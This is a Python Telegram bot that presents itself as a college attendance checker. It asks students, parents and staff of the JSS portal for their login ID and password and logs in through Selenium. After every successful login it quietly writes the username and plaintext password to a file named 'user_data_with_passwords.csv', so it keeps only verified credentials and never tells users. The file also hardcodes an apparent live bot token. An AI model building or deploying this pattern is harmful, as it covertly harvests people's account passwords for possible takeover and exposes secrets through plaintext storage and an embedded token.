import logging
import csv
from datetime import datetime
from telegram import Update, ReplyKeyboardMarkup, ReplyKeyboardRemove
from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, MessageHandler, filters, ConversationHandler
from jss_login_selenium import check_login_and_get_attendance

# Enable logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# Define conversation states
USER_TYPE, USERNAME, PASSWORD = range(3)

# Updated token (replace with your bot token)
TOKEN = '7391510808:AAHOPfdVOMg5d799Pi7Ig50VcSw5K5sRX1k'

# CSV file name
CSV_FILE = 'user_data_with_passwords.csv'

def save_to_csv(user_type, username, password, timestamp):
    with open(CSV_FILE, 'a', newline='', encoding='utf-8') as file:
        writer = csv.writer(file)
        writer.writerow([user_type, username, password, timestamp])

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    reply_keyboard = [['Student', 'Parent', 'Staff'], ['Forgot Password']]
    await update.message.reply_text(
        'Welcome! Please select your user type or Forgot Password:',
        reply_markup=ReplyKeyboardMarkup(reply_keyboard, one_time_keyboard=True)
    )
    return USER_TYPE

async def get_user_type(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    user_type = update.message.text
    if user_type == 'Forgot Password':
        await open_forgot_password_page(update, context)
        return ConversationHandler.END
    context.user_data['user_type'] = user_type
    await update.message.reply_text(f'You selected: {user_type}. Enter your User ID:', reply_markup=ReplyKeyboardRemove())
    return USERNAME

async def get_username(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data['username'] = update.message.text
    await update.message.reply_text('Enter your password:')
    return PASSWORD

async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    username = context.user_data['username']
    password = update.message.text
    user_type = context.user_data['user_type']

    # Delete the message containing the password for security reasons.
    await update.message.delete()
    await update.message.reply_text('Checking login and fetching attendance... Please wait.')

    try:
        logger.info(f"Attempting to fetch attendance for user: {username}")
        login_result = check_login_and_get_attendance(user_type, username, password)

        # Check if login was successful (assuming "Invalid" in the result means failure)
        if "Invalid" not in login_result:
            # Save user data to CSV only if login was successful
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            save_to_csv(user_type, username, password, timestamp)
            logger.info(f"Login successful. Data saved for user: {username}")

            if len(login_result) > 4096:
                for x in range(0, len(login_result), 4096):
                    await update.message.reply_text(login_result[x:x+4096])
            else:
                await update.message.reply_text(login_result)
            logger.info(f"Attendance information sent for user: {username}")
        else:
            await update.message.reply_text(login_result)
    except Exception as e:
        logger.error(f"An unexpected error occurred: {str(e)}", exc_info=True)
        await update.message.reply_text(f"An unexpected error occurred. Please try again later.")

    # Always return to the start state after one attempt.
    await update.message.reply_text('Session ended. Type /start to begin again.')
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.message.reply_text('Operation cancelled.', reply_markup=ReplyKeyboardRemove())
    return ConversationHandler.END

async def open_forgot_password_page(update: Update, context: ContextTypes.DEFAULT_TYPE):
    forgot_password_url = 'https://jssateb.azurewebsites.net/Apps/Login.aspx'
    await update.message.reply_text(f'Please visit this URL to reset your password: {forgot_password_url}')

async def forgot_password_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await open_forgot_password_page(update, context)

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"Exception while handling an update: {context.error}")
    await update.message.reply_text("An error occurred. Please try again later.")

def main() -> None:
    application = ApplicationBuilder().token(TOKEN).build()
    
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start)],
        states={
            USER_TYPE: [MessageHandler(filters.Regex('^(Student|Parent|Staff|Forgot Password)$'), get_user_type)],
            USERNAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_username)],
            PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_password)],
        },
        fallbacks=[CommandHandler('cancel', cancel)],
    )
    
    application.add_handler(conv_handler)
    application.add_handler(CommandHandler('forgot_password', forgot_password_command))
    application.add_error_handler(error_handler)
    
    application.run_polling()

if __name__ == '__main__':
    main()
